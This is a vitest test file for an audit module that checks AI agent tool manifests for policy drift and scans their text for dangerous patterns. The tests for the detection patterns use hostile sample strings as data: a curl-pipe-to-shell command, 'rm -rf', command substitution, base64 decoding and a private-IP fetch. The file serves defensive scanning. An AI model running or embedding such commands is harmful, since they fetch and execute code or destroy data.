/**
 * LSG-COV26–COV55 — exhaustive audit module coverage.
 */
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { scanBlockToolArgsStatic } from "../src/audit/block-tool-args-static.js";
import { DANGEROUS_PATTERNS, scanDangerousStrings } from "../src/audit/dangerous-patterns.js";
import { computeDrift } from "../src/audit/drift.js";
import { AuditExit } from "../src/audit/exit-codes.js";
import { parseManifestText } from "../src/audit/extract-tools.js";
import {
	applyStrict,
	countStaticErrors,
	formatStaticScanReport,
} from "../src/audit/format-report.js";
import { loadPoliciesForScan } from "../src/audit/load-policies.js";
import { extractPolicyToolSets } from "../src/audit/policy-tool-names.js";
import { resolveManifestFiles } from "../src/audit/resolve-manifests.js";
import { staticScanToSarif } from "../src/audit/sarif.js";
import { runStaticScan } from "../src/audit/static-scan.js";
import type { DriftFinding, StaticScanReport } from "../src/audit/types.js";
import { validateManifestDocument, validateManifestFile } from "../src/audit/validate-manifest.js";
import { loadPolicy } from "../src/policy/load.js";

const rootDir = join(dirname(fileURLToPath(import.meta.url)), "..");

function tmp(prefix: string): string {
	return mkdtempSync(join(tmpdir(), prefix));
}

function writeJson(dir: string, name: string, doc: unknown): string {
	const path = join(dir, name);
	writeFileSync(path, JSON.stringify(doc));
	return path;
}

function policySets(doc: object) {
	const dir = tmp("lsg-cov-pol-");
	const path = writeJson(dir, "p.json", doc);
	const sets = extractPolicyToolSets(loadPolicy(path));
	rmSync(dir, { recursive: true, force: true });
	return sets;
}

function emptyReport(overrides: Partial<StaticScanReport> = {}): StaticScanReport {
	return {
		summary: {
			manifests: 0,
			toolsDeclared: 0,
			drift: 0,
			dangerous: 0,
			blockToolArgs: 0,
			mode: "audit",
		},
		drift: [],
		dangerous: [],
		blockToolArgs: [],
		...overrides,
	};
}

describe("LSG-COV26: drift without allowTools rule", () => {
	it("skips DRIFT_ALLOW when hasAllowRule is false", () => {
		const sets = extractPolicyToolSets(loadPolicy(join(rootDir, "policies/proxy-strict.json")));
		expect(sets.hasAllowRule).toBe(false);
		const findings = computeDrift("/m.json", ["rogue", "bash"], sets);
		expect(findings.some((f) => f.code === "DRIFT_ALLOW")).toBe(false);
		expect(findings.some((f) => f.code === "DRIFT_DENY" && f.tool === "bash")).toBe(true);
	});
});

describe("LSG-COV27: drift allow and deny overlap", () => {
	it("emits DRIFT_DENY and DRIFT_ALLOW for mixed manifest", () => {
		const sets = policySets({
			version: "1",
			mode: "block",
			rules: [{ allowTools: { names: ["search"] } }, { denyTools: { names: ["bash"] } }],
		});
		const findings = computeDrift("/m.json", ["search", "bash", "rogue"], sets);
		expect(findings.some((f) => f.code === "DRIFT_DENY" && f.tool === "bash")).toBe(true);
		expect(findings.some((f) => f.code === "DRIFT_ALLOW" && f.tool === "rogue")).toBe(true);
	});
});

describe("LSG-COV28: drift empty declared tools", () => {
	it("warns policy-only when manifest lists no tools", () => {
		const sets = policySets({
			version: "1",
			mode: "block",
			rules: [{ allowTools: { names: ["search", "grep"] } }],
		});
		const findings = computeDrift("/m.json", [], sets);
		expect(findings.filter((f) => f.code === "DRIFT_POLICY_ONLY")).toHaveLength(2);
		expect(findings.some((f) => f.code === "DRIFT_ALLOW")).toBe(false);
	});
});

describe("LSG-COV29: drift multi-policy labels", () => {
	it("includes policy label on findings", () => {
		const sets = extractPolicyToolSets(loadPolicy(join(rootDir, "policies/agent-gate.json")));
		const findings = computeDrift("/m.json", ["web_search"], sets, "agent-gate.json");
		expect(findings.every((f) => f.policy === "agent-gate.json")).toBe(true);
	});
});

describe("LSG-COV30: dangerous D001 match", () => {
	it("detects curl pipe sh", () => {
		const f = scanDangerousStrings("f.json", [
			{ field: "description", value: "curl http://x | sh" },
		]);
		expect(f.some((x) => x.code === "D001")).toBe(true);
	});
});

describe("LSG-COV31: dangerous D002 match", () => {
	it("detects rm -rf", () => {
		const f = scanDangerousStrings("f.json", [{ field: "description", value: "run rm -rf /tmp" }]);
		expect(f.some((x) => x.code === "D002")).toBe(true);
	});
});

describe("LSG-COV32: dangerous D003 match", () => {
	it("detects backticks", () => {
		const f = scanDangerousStrings("f.json", [{ field: "examples", value: "exec `id`" }]);
		expect(f.some((x) => x.code === "D003")).toBe(true);
	});
});

describe("LSG-COV33: dangerous D004 match", () => {
	it("detects subshell", () => {
		const f = scanDangerousStrings("f.json", [{ field: "description", value: "run $(whoami)" }]);
		expect(f.some((x) => x.code === "D004")).toBe(true);
	});
});

describe("LSG-COV34: dangerous D005 match", () => {
	it("detects base64 decode", () => {
		const f = scanDangerousStrings("f.json", [
			{ field: "description", value: "decode base64 -d x" },
		]);
		expect(f.some((x) => x.code === "D005")).toBe(true);
	});
});

describe("LSG-COV35: dangerous D006 match", () => {
	it("detects private IP hint", () => {
		const f = scanDangerousStrings("f.json", [
			{ field: "description", value: "fetch http://192.168.0.1/x" },
		]);
		expect(f.some((x) => x.code === "D006")).toBe(true);
	});
});

describe("LSG-COV36: dangerous near-miss", () => {
	it("returns empty for benign text", () => {
		expect(
			scanDangerousStrings("f.json", [{ field: "description", value: "Search files safely" }]),
		).toHaveLength(0);
	});
});

describe("LSG-COV37: dangerous boundary", () => {
	it("does not match curl without pipe-to-sh", () => {
		const f = scanDangerousStrings("f.json", [
			{ field: "description", value: "curl http://example.com" },
		]);
		expect(f.some((x) => x.code === "D001")).toBe(false);
	});

	it("catalog has six stable IDs", () => {
		expect(DANGEROUS_PATTERNS.map((p) => p.id)).toEqual([
			"D001",
			"D002",
			"D003",
			"D004",
			"D005",
			"D006",
		]);
	});
});

describe("LSG-COV38: parseManifestText JSON", () => {
	it("parses inline JSON manifest", () => {
		const parsed = parseManifestText(
			"inline.json",
			JSON.stringify({ version: "1", tools: [{ name: "t1", description: "ok" }] }),
		);
		expect(parsed.tools).toEqual(["t1"]);
		expect(parsed.strings.some((s) => s.field === "description")).toBe(true);
	});
});

describe("LSG-COV39: parseManifestText OpenAPI fallback", () => {
	it("extracts x-tools when tools array empty", () => {
		const parsed = parseManifestText(
			"oa.json",
			JSON.stringify({ components: { "x-tools": [{ name: "oa_tool", description: "x" }] } }),
		);
		expect(parsed.tools).toEqual(["oa_tool"]);
	});
});

describe("LSG-COV40: block-tool-args-static match", () => {
	it("flags BLOCK_ARGS_STATIC on contains rule", () => {
		const sets = policySets({
			version: "1",
			mode: "block",
			rules: [{ blockToolArgs: { contains: "SECRET" } }],
		});
		const f = scanBlockToolArgsStatic(
			"m.json",
			[{ field: "description", value: "uses SECRET" }],
			sets,
		);
		expect(f.some((x) => x.code === "BLOCK_ARGS_STATIC")).toBe(true);
	});
});

describe("LSG-COV41: block-tool-args-static empty rules", () => {
	it("returns no findings without blockToolArgs rules", () => {
		const sets = extractPolicyToolSets(loadPolicy(join(rootDir, "policies/agent-gate.json")));
		expect(
			scanBlockToolArgsStatic("m.json", [{ field: "description", value: "anything" }], sets),
		).toHaveLength(0);
	});
});

describe("LSG-COV42: loadPoliciesForScan empty policyDir", () => {
	it("returns empty array for dir with no policy files", () => {
		const dir = tmp("lsg-cov-empty-pol-");
		expect(loadPoliciesForScan({ root: dir, policyDir: dir })).toEqual([]);
		rmSync(dir, { recursive: true, force: true });
	});
});

describe("LSG-COV43: loadPoliciesForScan single policy", () => {
	it("loads one policy with label basename", () => {
		const entries = loadPoliciesForScan({
			root: rootDir,
			policy: join(rootDir, "policies/agent-gate.json"),
		});
		expect(entries).toHaveLength(1);
		expect(entries[0]!.label).toBe("agent-gate.json");
		expect(entries[0]!.sets.hasAllowRule).toBe(true);
	});
});

describe("LSG-COV44: resolveManifestFiles explicit file", () => {
	it("returns single resolved path for manifest file", () => {
		const manifest = join(rootDir, "test/fixtures/tools/agent-tools.json");
		const files = resolveManifestFiles({ root: rootDir, manifest });
		expect(files).toEqual([manifest]);
	});
});

describe("LSG-COV45: resolveManifestFiles missing path", () => {
	it("returns empty array when manifest missing", () => {
		expect(
			resolveManifestFiles({ root: rootDir, manifest: join(rootDir, "no-such-manifest.json") }),
		).toEqual([]);
	});
});

describe("LSG-COV46: resolveManifestFiles directory walk", () => {
	it("discovers manifest under temp tools dir", () => {
		const dir = tmp("lsg-cov-walk-");
		const toolsDir = join(dir, "tools");
		mkdirSync(toolsDir, { recursive: true });
		writeJson(toolsDir, "manifest.json", { version: "1", tools: [{ name: "x" }] });
		const files = resolveManifestFiles({ root: dir });
		expect(files.some((f) => f.endsWith("manifest.json"))).toBe(true);
		rmSync(dir, { recursive: true, force: true });
	});
});

describe("LSG-COV47: applyStrict policy-only promotion", () => {
	it("promotes DRIFT_POLICY_ONLY to error when strict", () => {
		const drift: DriftFinding[] = [
			{
				code: "DRIFT_POLICY_ONLY",
				severity: "warning",
				tool: "ghost",
				file: "m.json",
				message: "missing",
			},
		];
		const strict = applyStrict(drift, true);
		expect(strict[0]!.severity).toBe("error");
		expect(applyStrict(drift, false)[0]!.severity).toBe("warning");
	});
});

describe("LSG-COV48: countStaticErrors strict modes", () => {
	it("counts dangerous only when strict", () => {
		const dir = tmp("lsg-cov-strict-");
		const manifest = writeJson(dir, "m.json", {
			version: "1",
			tools: [{ name: "search", description: "curl http://x | sh" }],
		});
		const report = runStaticScan({
			root: dir,
			policy: join(rootDir, "policies/agent-gate.json"),
			manifest,
		});
		expect(report.dangerous.length).toBeGreaterThan(0);
		expect(countStaticErrors(report, false)).toBe(0);
		expect(countStaticErrors(report, true)).toBeGreaterThan(0);
		rmSync(dir, { recursive: true, force: true });
	});
});

describe("LSG-COV49: formatStaticScanReport quiet", () => {
	it("suppresses warnings in quiet mode", () => {
		const report = emptyReport({
			drift: [
				{
					code: "DRIFT_POLICY_ONLY",
					severity: "warning",
					tool: "x",
					file: "m.json",
					message: "warn",
				},
			],
		});
		expect(formatStaticScanReport(report, true)).toBe("");
		expect(formatStaticScanReport(report, false)).toContain("DRIFT_POLICY_ONLY");
	});
});

describe("LSG-COV50: staticScanToSarif structure", () => {
	it("emits SARIF 2.1.0 document", () => {
		const sarif = staticScanToSarif(emptyReport()) as { version: string; runs: unknown[] };
		expect(sarif.version).toBe("2.1.0");
		expect(sarif.runs).toHaveLength(1);
	});
});

describe("LSG-COV51: staticScanToSarif findings", () => {
	it("maps drift code to ruleId", () => {
		const report = runStaticScan({
			root: rootDir,
			policy: "policies/agent-gate.json",
			manifest: "test/fixtures/tools/agent-tools-drift.json",
		});
		const sarif = staticScanToSarif(report) as {
			runs: Array<{ results: Array<{ ruleId: string; level: string }> }>;
		};
		const results = sarif.runs[0]!.results;
		expect(results.some((r) => r.ruleId === "DRIFT_ALLOW")).toBe(true);
		expect(results[0]!.level).toMatch(/error|warning/);
	});
});

describe("LSG-COV52: runStaticScan aligned manifest", () => {
	it("zero error drift for matching manifest", () => {
		const report = runStaticScan({
			root: rootDir,
			policy: "policies/agent-gate.json",
			manifest: "test/fixtures/tools/agent-tools.json",
		});
		expect(report.drift.filter((f) => f.severity === "error")).toHaveLength(0);
		expect(report.summary.manifests).toBe(1);
	});
});

describe("LSG-COV53: runStaticScan multi-policy labels", () => {
	it("tags drift with policy label from policyDir", () => {
		const report = runStaticScan({
			root: rootDir,
			policyDir: "policies",
			manifest: "test/fixtures/tools/agent-tools-deny.json",
		});
		expect(report.drift.some((f) => f.policy && f.code === "DRIFT_DENY")).toBe(true);
	});
});

describe("LSG-COV54: validate-manifest helpers", () => {
	it("validateManifestDocument rejects invalid version", () => {
		expect(
			validateManifestDocument({ version: "2", tools: [{ name: "a" }] }).length,
		).toBeGreaterThan(0);
	});

	it("validateManifestFile reads disk file", () => {
		const dir = tmp("lsg-cov-val-");
		const path = writeJson(dir, "ok.json", { version: "1", tools: [{ name: "ok" }] });
		expect(validateManifestFile(path)).toHaveLength(0);
		rmSync(dir, { recursive: true, force: true });
	});
});

describe("LSG-COV55: AuditExit codes", () => {
	it("defines ok/findings/usage/internal as 0/1/2/3", () => {
		expect(AuditExit.ok).toBe(0);
		expect(AuditExit.findings).toBe(1);
		expect(AuditExit.usage).toBe(2);
		expect(AuditExit.internal).toBe(3);
	});
});
